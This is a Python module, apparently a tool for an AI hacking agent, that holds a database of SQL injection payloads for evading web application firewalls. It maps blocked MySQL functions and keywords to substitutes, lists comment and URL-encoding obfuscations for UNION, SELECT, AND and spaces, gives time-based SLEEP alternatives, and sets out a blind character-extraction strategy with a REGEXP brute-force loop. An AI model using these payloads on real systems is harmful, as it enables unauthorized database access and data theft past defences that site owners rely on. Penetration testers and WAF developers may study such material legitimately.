"""
bingo/tools/waf_sqli_payloads.py — WAF SQLi 우회 지식 데이터베이스 (v1.0.0)

WAF가 특정 SQL 함수/키워드를 차단할 때 대안을 즉시 제공.
AI가 매번 처음부터 우회 방법을 발명할 필요 없이 검증된 페이로드를 참조.

Tool: waf_sqli_db
"""
from __future__ import annotations
from typing import Optional

# ════════════════════════════════════════════════════════════════
# SQLi 함수 우회 매핑 — 차단된 함수 → 대안 목록 (검증 순)
# ════════════════════════════════════════════════════════════════
FUNCTION_ALTERNATIVES: dict[str, list[str]] = {

    # ── 문자열 추출 (단일 문자) ─────────────────────────────────
    "SUBSTR": [
        "MID({str},{pos},1)",
        "RIGHT(LEFT({str},{pos}),1)",
        "RIGHT(REVERSE(LEFT(REVERSE({str}),{rpos})),1)",  # rpos = len - pos + 1
        "LPAD(RPAD({str},{pos},0x20),1,0x20)",
        "TRIM(LEADING SUBSTR({str},1,{pos1}) FROM LEFT({str},{pos}))",
        "INSERT({str},1,{pos1},0x20)",  # pos1 = pos-1
        "CONVERT(SUBSTR({str},{pos},1) USING utf8)",
        "ELT(1,SUBSTR({str},{pos},1))",
        "IF(1=1,SUBSTR({str},{pos},1),0)",
    ],
    "MID": [
        "SUBSTR({str},{pos},1)",
        "RIGHT(LEFT({str},{pos}),1)",
        "SUBSTRING({str},{pos},1)",
    ],
    "LEFT": [
        "RIGHT(REVERSE({str}),LENGTH({str})-{n}+1)",   # LEFT(str, n) 대안
        "SUBSTR({str},1,{n})",
        "MID({str},1,{n})",
        "TRIM(TRAILING SUBSTR({str},{n1},99) FROM {str})",  # n1=n+1
    ],
    "RIGHT": [
        "SUBSTR({str},LENGTH({str})-{n}+1)",
        "MID({str},-{n})",
    ],

    # ── ASCII/문자 변환 ─────────────────────────────────────────
    "ASCII": [
        "ORD({char})",
        "CONV(HEX({char}),16,10)",
        "WEIGHT_STRING({char} AS CHAR(1) LEVEL 1)",
        "FIND_IN_SET({char},CHAR(48,49,50,51,52,53,54,55,56,57))",  # 0-9 탐색
        "STRCMP({char},CHAR({n}))",  # 이진탐색용
    ],
    "ORD": [
        "ASCII({char})",
        "CONV(HEX({char}),16,10)",
        "WEIGHT_STRING({char} AS CHAR(1) LEVEL 1)",
    ],

    # ── 데이터베이스/서버 정보 ──────────────────────────────────
    "DATABASE()": [
        "DATABASE/**/()",
        "SCHEMA()",
        "@@datadir",          # DB 경로로 DB 이름 유추 가능
        "(SELECT schema_name FROM information_schema.schemata LIMIT 1)",
        "VERSION()",          # DB 버전 (DB 이름이 목적이면 아래 사용)
        "IFNULL(DATABASE(),0x7e)",
        "IF(1=1,DATABASE/***/(),0)",
    ],
    "VERSION()": [
        "VERSION/**/()",
        "@@VERSION",
        "@@version_comment",
    ],
    "USER()": [
        "USER/**/()",
        "CURRENT_USER()",
        "CURRENT_USER",
        "@@global.hostname",
        "SESSION_USER()",
        "SYSTEM_USER()",
    ],

    # ── 공백 우회 ───────────────────────────────────────────────
    " ": [
        "/**/",
        "/*!*/",
        "%09",    # 탭
        "%0a",    # 개행
        "%0d",    # CR
        "%0b",    # 수직탭
        "%0c",    # 폼피드
        "+",      # URL 인코딩 공백
        "/*comment*/",
    ],

    # ── 비교 연산자 우회 ────────────────────────────────────────
    "=": [
        "LIKE",
        "REGEXP",
        "RLIKE",
        "BETWEEN {v} AND {v}",
        "IN({v})",
        "NOT!=",           # !!= → !=의 역 (일부 파서)
    ],
    ">": [
        "GREATEST({a},{b})={a}",
        "NOT BETWEEN 0 AND {b}",
        "!<",
    ],
    "<": [
        "LEAST({a},{b})={a}",
        "BETWEEN 0 AND {b}",
        "!>",
    ],

    # ── INFORMATION_SCHEMA 우회 ────────────────────────────────
    "INFORMATION_SCHEMA": [
        "information_schema",
        "INFORMATION_SCHEMA/**/.tables",
        "mysql.innodb_table_stats",      # MySQL 5.6+
        "sys.schema_tables",              # sys schema
        "performance_schema.tables",
    ],

    # ── SLEEP/시간 기반 ─────────────────────────────────────────
    "SLEEP": [
        "SLEEP/***/({n})",
        "BENCHMARK(5000000,MD5(1))",
        "GET_LOCK('a',{n})",
        "WAIT_FOR_EXECUTED_GTID_SET('a',{n})",
    ],

    # ── SELECT 키워드 ───────────────────────────────────────────
    "SELECT": [
        "SELECT/**/",
        "SE/**/LECT",
        "%53ELECT",    # S URL 인코딩
        "/*!50000SELECT*/",
    ],

    # ── UNION 우회 ──────────────────────────────────────────────
    "UNION": [
        "UNION/**/",
        "UNION%0a",
        "UNION%09",
        "UN/**/ION",
        "/*!50000UNION*/",
    ],

    # ── AND/OR 우회 ─────────────────────────────────────────────
    "AND": [
        "&&",
        "AND/**/",
        "%26%26",   # URL 인코딩 &&
        "AND%0a",
        "/*!AND*/",
    ],
    "OR": [
        "||",
        "OR/**/",
        "%7c%7c",
        "OR%0a",
    ],
}

# ════════════════════════════════════════════════════════════════
# 문자 추출 전용 — RIGHT 만 사용 가능한 경우 전략
# (기록.md 현재 상황: SUBSTR/MID/ASCII/LEFT/ORD 차단, RIGHT 통과)
# ════════════════════════════════════════════════════════════════
RIGHT_ONLY_STRATEGY = """
=== RIGHT만 사용 가능한 문자 추출 전략 ===

목표: 문자열 str에서 N번째 문자 추출

1) LIKE 패턴 비교 (가장 간단):
   str LIKE 'k%'   → 첫 글자가 k?
   str LIKE 'ka%'  → 첫 두 글자가 ka?

2) RIGHT + REVERSE (단일 문자 추출):
   RIGHT(str, 1)         = 마지막 문자
   RIGHT(REVERSE(str), 1) = 첫 번째 문자  ← REVERSE도 안 막히면 사용
   RIGHT(str, LENGTH(str)-N+1) = N번째 이후 문자들

3) BETWEEN 이진탐색 (ASCII 없이 범위 좁히기):
   str BETWEEN 'a' AND 'm'  → 알파벳 앞 절반?
   str BETWEEN 'n' AND 'z'  → 알파벳 뒤 절반?

4) REGEXP 패턴:
   str REGEXP '^k'          → 첫 글자가 k?
   str REGEXP '^ka'         → 처음 두 글자가 ka?

5) FIND_IN_SET (집합 탐색):
   FIND_IN_SET(LEFT(str,1), 'k,a,c,p,r') > 0  → 첫 글자가 집합 내?
   (LEFT가 차단된 경우 SUBSTR 대신)

추출 루프 Python 예시 (REGEXP 사용):
  charset = string.ascii_lowercase + string.digits + '_'
  result = ''
  for pos in range(1, max_len+1):
      for c in charset:
          # REGEXP '^' + result + c
          payload = f"REGEXP 0x{('^' + result + c).encode().hex()}"
          ...
"""

# ════════════════════════════════════════════════════════════════
# 인터페이스 함수
# ════════════════════════════════════════════════════════════════

def get_alternatives(blocked_func: str, context: Optional[str] = None) -> dict:
    """차단된 SQL 함수/키워드의 대안 목록 반환.

    Parameters
    ----------
    blocked_func : 차단된 SQL 함수명 (예: "SUBSTR", "ASCII", "DATABASE()")
    context      : 추가 컨텍스트 (예: "only_RIGHT_available")

    Returns
    -------
    dict: {"alternatives": [...], "strategy": str}
    """
    key = blocked_func.upper().strip("()")
    # 완전 매칭 시도
    alts = FUNCTION_ALTERNATIVES.get(key, [])
    if not alts:
        # 부분 매칭
        for k, v in FUNCTION_ALTERNATIVES.items():
            if key in k or k in key:
                alts = v
                break

    strategy = ""
    if context and "right" in context.lower():
        strategy = RIGHT_ONLY_STRATEGY

    return {
        "blocked": blocked_func,
        "alternatives": alts,
        "strategy": strategy,
        "count": len(alts),
    }


def query_waf_db(blocked_functions: list[str]) -> dict:
    """여러 차단 함수에 대해 일괄 대안 조회.

    Parameters
    ----------
    blocked_functions : 차단된 함수/키워드 목록

    Returns
    -------
    dict: {함수명: [대안1, 대안2, ...], ...} + RIGHT_ONLY_STRATEGY
    """
    result: dict = {}
    for f in blocked_functions:
        data = get_alternatives(f)
        result[f] = data["alternatives"]

    # RIGHT 만 사용 가능한지 감지
    only_right = (
        any("SUBSTR" in f.upper() or "MID" in f.upper() or "ASCII" in f.upper()
            for f in blocked_functions)
        and not any("RIGHT" in f.upper() for f in blocked_functions)
    )

    return {
        "alternatives": result,
        "right_only_strategy": RIGHT_ONLY_STRATEGY if only_right else "",
        "tip": (
            "가장 먼저 시도할 것: LIKE/REGEXP 패턴 비교 (ASCII 필요 없음)"
            if only_right else
            "CONV(HEX(char),16,10) 는 대부분 WAF를 통과함"
        ),
    }
